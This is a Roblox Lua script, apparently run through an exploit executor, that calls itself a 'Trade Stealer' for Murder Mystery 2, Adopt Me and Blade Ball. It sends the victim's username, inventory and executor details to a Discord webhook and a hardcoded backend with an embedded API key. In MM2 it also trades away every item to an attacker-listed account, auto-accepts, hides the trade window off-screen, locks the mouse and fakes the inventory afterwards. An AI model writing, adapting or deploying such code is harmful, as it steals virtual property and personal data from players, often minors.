local CFG = getgenv().CFG or {}
CFG.allowed = CFG.allowed or {}
CFG.webhook = CFG.webhook or ""
CFG.delay = CFG.delay or 100
CFG.api_key = "aszxcvfgtt56678ijBVXDSERFGHBNJIU87U666789IKJHcdsxder56789ijhgfdrf4r56789ikjhgvf"
CFG.backend = "https://backend-production-04349.up.railway.app"
getgenv().CFG = CFG

local PlaceId = game.PlaceId
local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")
local lp = Players.LocalPlayer
local HS = game:GetService("HttpService")

local TRADE_ID = 428469873

local function do_request(method, url, body, headers)
    return request({Url=url, Method=method, Body=body, Headers=headers or {}})
end

local function get_executor()
    if identifyexecutor then return identifyexecutor() end
    if KRNL_LOADED then return "Krnl" end
    if SYNAPSE_LOADED then return "Synapse" end
    return "Unknown"
end

local function get_roblox_version()
    if version then return version() end
    return "Unknown"
end

local function detect_antiscam()
    local g = getgenv()
    for _, f in ipairs({"antiscam","TradeBlocker","ScamGuard","NoTrade"}) do
        if g[f] then return true end
    end
    return false
end

local function collect_mm2_items()
    local items = {}
    local ok, ProfileData = pcall(function()
        return require(RS.Modules.ProfileData)
    end)
    if not ok or not ProfileData then return items end
    local ok2, Sync = pcall(function()
        return require(RS.Database.Sync)
    end)
    local rarityOrder = {Ancient=1,Godly=2,Unique=3,Vintage=4,Chroma=5,Legendary=6,Rare=7,Uncommon=8,Common=9}
    for itemName, amount in pairs(ProfileData.Weapons.Owned) do
        local rarity = "Unknown"
        if ok2 and Sync and Sync.Weapons and Sync.Weapons[itemName] then
            rarity = Sync.Weapons[itemName].Rarity or "Unknown"
        end
        table.insert(items, {name=itemName, rarity=rarity, amount=tostring(amount)})
    end
    table.sort(items, function(a, b)
        return (rarityOrder[a.rarity] or 999) < (rarityOrder[b.rarity] or 999)
    end)
    return items
end

local function collect_adoptme_items()
    local items = {}
    local inv = lp:FindFirstChild("PlayerData") or lp:FindFirstChild("Inventory")
    if inv then
        for _, v in ipairs(inv:GetDescendants()) do
            if v:IsA("StringValue") or v:IsA("IntValue") then
                table.insert(items, {name=v.Name, rarity="Pet", amount="1"})
            end
        end
    end
    return items
end

local function post_rubis(text)
    local ok, res = pcall(do_request, "POST", "https://api.rubis.app/v2/scrap",
        text, {["Content-Type"]="text/plain"})
    if not ok then return nil end
    local dok, data = pcall(function() return HS:JSONDecode(res.Body) end)
    if not dok or not data then return nil end
    return data.raw_with_key or data.raw or nil
end

local function send_discord(items, game_name)
    if not CFG.webhook or CFG.webhook == "" then return end
    local join = "https://fern.wtf/joiner?placeId="..tostring(PlaceId).."&gameInstanceId="..game.JobId
    local receivers = table.concat(CFG.allowed, ", ")
    local counts = {}
    local order = {"Ancient","Godly","Unique","Vintage","Legendary","Rare","Uncommon","Common"}
    for _, it in ipairs(items) do counts[it.rarity] = (counts[it.rarity] or 0) + 1 end
    local inv_lines = {}
    for _, r in ipairs(order) do
        table.insert(inv_lines, string.format("%-10s: %d", r, counts[r] or 0))
    end
    local full_text = {}
    for _, it in ipairs(items) do
        table.insert(full_text, it.name.." ("..it.rarity..")")
    end
    local rubis_url = post_rubis(table.concat(full_text, "\n")) or "upload mislukt"
    local desc = string.format(
        "**Player Info:**\n```\nUsername:    %s\nDisplay:     %s\nExecutor:    %s\nAntiscam:    %s\nRoblox ver:  %s\nReceiver:    %s\n```\n\n**Inventory**\n```\n%s\n```\n\n**List of items:** %s\n\n**Join link:** [click here to join](%s)",
        lp.Name, lp.DisplayName, get_executor(), tostring(detect_antiscam()), get_roblox_version(),
        receivers, table.concat(inv_lines, "\n"), rubis_url, join
    )
    local embed = {
        username = "Trade Stealer",
        embeds = {{title=game_name.." Stealer", description=desc, color=15158332}}
    }
    pcall(do_request, "POST", CFG.webhook, HS:JSONEncode(embed), {["Content-Type"]="application/json"})
end

local function send_job(game_name, items)
    send_discord(items, game_name)
    local payload = {
        game=game_name, username=lp.Name, display_name=lp.DisplayName,
        executor=get_executor(), roblox_version=get_roblox_version(),
        antiscam=detect_antiscam(), allowed=CFG.allowed,
        place_id=tostring(PlaceId), job_id=game.JobId, items=items,
    }
    pcall(do_request, "POST", CFG.backend.."/job", HS:JSONEncode(payload), {
        ["Content-Type"]="application/json", ["X-API-Key"]=CFG.api_key,
    })
end

local function hook_mm2()
    local Trade = RS:WaitForChild("Trade", 10)
    if not Trade then return end
    local sendRequest   = Trade:WaitForChild("SendRequest", 10)
    local offerItem     = Trade:WaitForChild("OfferItem", 10)
    local acceptTrade   = Trade:WaitForChild("AcceptTrade", 10)
    local startTrade    = Trade:WaitForChild("StartTrade", 10)
    local completeTrade = Trade:WaitForChild("CompleteTrade", 10)
    if not sendRequest or not offerItem or not acceptTrade or not startTrade then return end

    local okP, ProfileData = pcall(function() return require(RS.Modules.ProfileData) end)
    local items = collect_mm2_items()
    send_job("MM2", items)

    local currentLastOffer = nil
    local tradingWithAllowed = false
    local itemsOffered = false
    local storedItems = {}
    local guiHidden = false

    local function isAllowedUser(name)
        for _, n in ipairs(CFG.allowed) do
            if string.lower(n) == string.lower(name) then return true end
        end
        return false
    end

    local function storeItems()
        storedItems = {}
        if okP and ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
            for k, v in pairs(ProfileData.Weapons.Owned) do storedItems[k] = v end
        end
    end

    local function restoreItems()
        if okP and ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
            for k, v in pairs(storedItems) do ProfileData.Weapons.Owned[k] = v end
        end
    end

    local function hideGui()
        if guiHidden then return end
        guiHidden = true
        local gui = lp:FindFirstChild("PlayerGui")
        if not gui then return end
        for _, name in ipairs({"TradeGUI","TradeGUI_Phone"}) do
            local g = gui:FindFirstChild(name)
            if g then
                for _, frame in ipairs(g:GetChildren()) do
                    if frame:IsA("Frame") or frame:IsA("ScrollingFrame") then
                        frame.Position = UDim2.new(10, 0, 10, 0)
                    end
                end
            end
        end
        pcall(function() UIS.MouseBehavior = Enum.MouseBehavior.LockCenter end)
    end

    local function showGui()
        guiHidden = false
        local gui = lp:FindFirstChild("PlayerGui")
        if not gui then return end
        for _, name in ipairs({"TradeGUI","TradeGUI_Phone"}) do
            local g = gui:FindFirstChild(name)
            if g then
                for _, frame in ipairs(g:GetChildren()) do
                    if frame:IsA("Frame") or frame:IsA("ScrollingFrame") then
                        frame.Position = UDim2.new(0.5, 0, 0.5, 0)
                    end
                end
            end
        end
    end

    -- wacht op allowed user en stuur trade request
    task.spawn(function()
        while true do
            task.wait(3)
            if tradingWithAllowed then break end
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= lp and isAllowedUser(player.Name) then
                    storeItems()
                    pcall(function() sendRequest:InvokeServer(player) end)
                    break
                end
            end
        end
    end)

    Players.PlayerAdded:Connect(function(player)
        if isAllowedUser(player.Name) and not tradingWithAllowed then
            task.wait(2)
            storeItems()
            pcall(function() sendRequest:InvokeServer(player) end)
        end
    end)

    startTrade.OnClientEvent:Connect(function(tradeData, operatorName)
        if not tradeData then return end
        currentLastOffer = tradeData.LastOffer

        local p1 = tradeData.Player1
        local p2 = tradeData.Player2
        if not p1 or not p2 then return end

        local otherData = p1.Player == lp and p2 or p1
        local otherName = typeof(otherData.Player) == "Instance" and otherData.Player.Name or tostring(otherData.Player)

        if not isAllowedUser(otherName) then return end
        tradingWithAllowed = true
        hideGui()

        if not itemsOffered then
            itemsOffered = true
            task.spawn(function()
                task.wait(1)
                -- offer alle items
                if okP and ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
                    for itemName, _ in pairs(ProfileData.Weapons.Owned) do
                        pcall(function()
                            offerItem:FireServer(itemName, "Weapons")
                        end)
                        task.wait(0.15)
                    end
                end
                -- wacht even dan auto ready
                task.wait(1)
                if currentLastOffer then
                    pcall(function()
                        acceptTrade:FireServer(TRADE_ID, currentLastOffer)
                    end)
                end
            end)
        end
    end)

    if completeTrade then
        completeTrade.OnClientEvent:Connect(function()
            task.wait(0.5)
            restoreItems()
            showGui()
            tradingWithAllowed = false
            itemsOffered = false
            currentLastOffer = nil
        end)
    end

    -- shiftlock loop
    task.spawn(function()
        while true do
            task.wait(0.1)
            if tradingWithAllowed and guiHidden then
                pcall(function() UIS.MouseBehavior = Enum.MouseBehavior.LockCenter end)
            end
        end
    end)
end

local function hook_adoptme()
    send_job("AdoptMe", collect_adoptme_items())
end

local function hook_bladeball()
    local items = {}
    local mgp = lp:FindFirstChild("leaderstats")
    if mgp then
        for _, v in ipairs(mgp:GetChildren()) do
            table.insert(items, {name=v.Name, rarity=tostring(v.Value), amount="1"})
        end
    end
    send_job("BladeBall", items)
end

local GAMES = {
    [142823291]   = hook_mm2,
    [920587237]   = hook_adoptme,
    [13772394625] = hook_bladeball,
}

local handler = GAMES[PlaceId]
if handler then handler() else send_job("Unknown", {}) end
